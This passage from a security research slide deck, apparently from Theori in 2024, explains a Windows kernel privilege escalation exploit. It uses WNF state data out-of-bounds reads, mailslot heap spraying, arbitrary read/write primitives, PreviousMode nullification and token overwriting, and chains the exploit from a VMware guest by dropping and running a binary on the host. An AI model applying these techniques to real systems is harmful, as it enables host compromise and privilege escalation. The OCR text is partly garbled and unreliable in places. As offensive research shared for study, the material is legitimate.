... v40, **Write Size** } **Cannot write more than 0x1000 bytes** v34); if ( res < 0 ) **(MaxStateSize <= 0x1000)** goto ERROR; ... }

©2024. Theori. All rights reserved.

49

## Slide 50

**Windows Kernel Exploit**

## **WNF_STATE_DATA – Big Chunk OOB Read**

### **NtQueryWnfStateData**

__int64 __fastcall ExpNtQueryWnfStateData(
...
__int64 __fastcall ExpWnfValidatePubSubPreconditions(
)
...)
{
{
...
...
res = ExpWnfValidatePubSubPreconditions(
TypeId = StateInfo->TypeId;
1u,
if ( !TypeId )
&Instance->StateNameInfo,
return StateInfo->MaxStateSize < Size ? 0xC000000D : 0;
0,
...
Read Size == 0 !!?
v36,
} Always pass the size validation
v21);
if ( res < 0 )
goto ERROR;
...
}

©2024. Theori. All rights reserved.

50

## Slide 51

**Windows Kernel Exploit**

## **Mailslot**

### Mechanism for **one-way** interprocess communications

Write Thread2
Create (\\mailslot\\xxx)
Thread1
Thread3
Write
Read
Write
Thread4

https://learn.microsoft.com/en-us/windows/win32/ipc/mailslots

©2024. Theori. All rights reserved.

51

## Slide 52

**Windows Kernel Exploit**

## **Mailslot Data Entry**

### Mailslot manages multiple received data using Data Entry Queue

Data Entry1

Data Entry2

Data Entry3

Data Entry4

©2024. Theori. All rights reserved.

52

## Slide 53

**Windows Kernel Exploit**

## **Mailslot Data Entry Object**

- **mutable object** and contains **useful members**

- **Sprayable Object**

   - By calling WriteFile multiple times from another thread

   - By creating multiple mailslot handles

- <u>Almost</u> **no size limit** ( < 4GB)

- Allocated in **<u>paged pool</u>**

struct mailslot_data_entry {

int is_overflowed;

int field_4; LIST_ENTRY data_queue_list; PIRP irp; DWORD **data_size** ; int field_24; BYTE * **buffer_ptr** ; WorkContext *worker_context; char **buffer[]** ; };

©2024. Theori. All rights reserved.

53

## Slide 54

**Windows Kernel Exploit**

## **Out-of-Bound Read**

MsWrite()

…  (Doesn’t matter)
DataSize
BufferPtr
MsPeek()
Buffer[]
OOB Read
Other Chunk

©2024. Theori. All rights reserved.

54

## Slide 55

**Windows Kernel Exploit**

## **Arbitrary Read**

MsWrite()

…  (Doesn’t matter)
DataSize
MsPeek()
BufferPtr 0xffffffffdeadbeef
Arbitrary Read
Buffer[]
Other Chunk

©2024. Theori. All rights reserved.

55

## Slide 56

**Windows Kernel Exploit**

## **Leaking Critical Object Address**

Mailslot Data Entry
Mailslot Context
…
Eprocess
…
Data Entry List
…
… Data Entry List
Thread List
MsWrite() DataSize …
BufferPtr Requestor Process …
Buffer …
Current Thread Object

©2024. Theori. All rights reserved.

56

## Slide 57

**Windows Kernel Exploit**

## **Arbitrary Nullification**

MsRemoveDataQueueEntry
...
MsRead()
IRP = entry->IRP;
if ( IRP )
Mailslot Data Entry
{
… MsCancelTimer(entry);
}
IRP (valid addr)
...
…
WorkContext
...
… WorkContext = entry->WorkContext;
if ( WorkContext )
Buffer {
Nullification
...
WorkContext ->IRP = 0i64;
...
MsCancelTimer

©2024. Theori. All rights reserved.

57

## Slide 58

**Windows Kernel Exploit**

## **Arbitrary Write**

**1st MsWrite()** ➀ **Create Data Entry**

Mailslot Context
Type Confusion
Mailslot Data Entry … Nullification
Queue Status
… (QUEUE_WATING)
➁ Leak Mailslot Context
…
Data Entry List ➂ Nullify Queue Status
Data Entry List
…
DataSize …
Arbitrary Address
BufferPtr
(0xffffcafedeadbeef) ➃ Overwrite BufferPtr
Buffer
2nd MsWrite() memcpy (0xffffcafedeadbeef,
UserBuffer ,
➄ Trigger Arbitrary Write UserSize )

©2024. Theori. All rights reserved.

58

## Slide 59

**Windows Kernel Exploit**

## **Exploitation - Layout**

### *** Heap Spray needed**

**Vuln Chunk (0x1000) WNF**

Mailslot

©2024. Theori. All rights reserved.

59

## Slide 60

**Windows Kernel Exploit**

## **Exploitation – Mailslot Header Info Leak**

HEADER1 HEADER2
LIST->FD LIST->FK
....
Vuln Chunk (0x1000) Size WNF Mailslot
WNF OOB Read

©2024. Theori. All rights reserved.

60

## Slide 61

**Windows Kernel Exploit**

## **Exploitation – Leveraging Arbitrary Nullification**

HEADER1 HEADER2
AARW
LIST->FD …
WorkerCtx …
....

*(&ETHREAD->PreviousMode) = 0
Vuln Chunk (0x1000) Size WNF Mailslot

#### **Trigger Vuln Again**

©2024. Theori. All rights reserved.

61

## Slide 62

**Windows Kernel Exploit**

## **Exploitation – Token Overwriting**

**Current EPROCESS Init EPROCESS ETHREAD** **… Traverse** **… ActiveProcessLinks ActiveProcessLinks … … … Process Token Token … Overwrite** **… …** **UniquePID(4)**

©2024. Theori. All rights reserved.

62

## Slide 63

## **4. Chaining Exploits**

©2024. Theori. All rights reserved.

## Slide 64

**Chaining exploits**

## **Run the Windows LPE exploit**

##### **1. shellcode runs in vmware-vmx**

##### **3. Run the Windows LPE on host**

##### **2. Drop the Windows LPE on host**

©2024. Theori. All rights reserved.

64

## Slide 65

**Chaining exploits**

## **Drop the Windows LPE exploit**

### **Goal : Drop 100k over binary to host and execute it**

- Conventional memory has enough unused pages to store LPE Exploit

physmem
conventional memory
....
Free
D000
VGA text video buffer
C000
monochrome region
B000
VGA graphics video buffer
A000 640K If all bytes of page are zero,
it is determined to be unused
conventional memory
0

©2024. Theori. All rights reserved.

65

## Slide 66

**Chaining exploits**

## **Run the Windows LPE exploit**

### **Build a shellcode**

**1. Call CreateFile(‘priv.exe’, ...)**

**2. Read Windows LPE binary blocks and write to file**

##### **LPE binary**

##### **conventional memory**

2
3 5
6
10 11
14
....

**saved by guest**

\```
block_table= [2,3,5,6,10,11,14, ...];
\```

\```
for(i=0; i<nblock; i++) {
readPhysmem(block_table[i] * PAGE_SIZE, buf);
WriteFile(hFile, buf, PAGE_SIZE);
}
\```

## **3. Call WinExec(‘priv.exe’, ...)**

©2024. Theori. All rights reserved.

66

## Slide 67

**Chaining exploits**

## **Demo**

©2024. Theori. All rights reserved.

67


> Recovered by OCR — confidence 82/100 on the text kept, 63/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
File Edit View
D Details
) Home =
AR Galley
This Pc
de Network
item:
Copilot in Windows (preview)
To return to your computer, move the mouse pointer outside or press Ctrl+ Alt
```

## Slide 68

## **5. Conclusion**

©2024. Theori. All rights reserved.

## Slide 69

## **Conclusion**

- **Focused, short-term goals lead to valuable learning (e.g., Pwn2Own)**

- **Improving reliability is crucial but challenging**

- **Exploit chaining isn't always straightforward**

- **Prepare for upcoming mitigations in advance**

©2024. Theori. All rights reserved.

69

## Slide 70

## **Questions?**

- Gwanun Jung

   - pr0ln@theori.io

   - @pr0ln

- Junoh Lee

   - bbbig@theori.io

   - @bbbig12

- @theori_io

©2024. Theori. All rights reserved.

70

## Slide 71

## **End Of Document**

©2024. Theori. All rights reserved.
